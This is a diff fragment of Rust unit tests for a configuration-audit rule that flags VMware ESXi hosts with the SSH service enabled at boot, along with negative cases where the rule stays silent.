+        assert!(check("esxi-ssh-at-boot", &leaf("ConfigRoot/service/TSM-SSH", "on")).is_some());
+        assert_eq!(check("esxi-ssh-at-boot", &leaf("ConfigRoot/service/TSM-SSH", "off")), None);
+        assert_eq!(check("esxi-ssh-at-boot", &leaf("ConfigRoot/service/ntpd", "on")), None);
+        assert_eq!(check("esxi-ssh-at-boot", &leaf("config/vpxa/hostIp", "192.0.2.10")), None);
     }
 }
